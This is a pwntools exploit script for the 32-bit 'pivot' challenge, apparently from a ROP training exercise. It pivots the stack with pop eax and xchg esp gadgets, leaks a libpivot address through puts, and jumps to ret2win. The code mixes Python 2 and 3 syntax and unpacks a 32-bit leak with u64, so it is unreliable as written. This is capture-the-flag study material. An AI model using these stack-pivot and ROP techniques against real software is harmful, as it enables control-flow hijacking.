from pwn import *
#import shared_pwn
##Pivot the stack
target = process('./pivot32')
elf=ELF('./pivot32')

target.recvuntil("pivot: ")
pivot_addr  = p32(int(target.recvuntil("\n").strip(), 16))
print("[!] Address on Heap: " + pivot_addr)
payload = "A" * 44

def pivot():
    out = ""
    pop_eax = p32(0x080488c0)
    out += pop_eax
    out += pivot_addr
    xchg_esp = p32(0x080488c2)
    out += xchg_esp
    return out
def leak():
    out = ""
    foot_plt = p32(elf.plt[b'foothold_function'])
    foot_got = p32(elf.got[b'foothold_function'])
    puts_plt = p32(elf.plt[b'puts'])
    main_ptr = p32(elf.symbols[b'main'])
    out += foot_plt
    out += puts_plt
    out += main_ptr
    out += foot_got
    return out

payload += pivot()
leak = leak()
###First fget == fake stack
###Second fget == gadget to pivot to fake stack

target.sendline(leak)
target.sendline(payload)
target.recvuntil("ibpivot.so")
foot_leak = target.recv()[:4].strip().ljust(8, b'\x00')
foot_leak = u64(foot_leak)
print "[!] Leaked address for foothold function: " +str(foot_leak)
print "[!] Finding Address for ret2win...."
ret2win_offset = 0x967
foot_offset= 0x770
# Calculating the addresses is achieved like:
#
# lib_base  = foot_leak - foot_offset
# ret2_addr = p32(lib_base + ret2_offset)

base = foot_leak - foot_offset
ret2win = base + ret2win_offset
print "[!] Found ret2win address at: "+str(ret2win)
ret2win = p32(base + ret2win_offset)
target.sendline()
target.recvuntil("> ")
final = "A" * 44
final += ret2win
target.sendline(final)
print(target.recv())
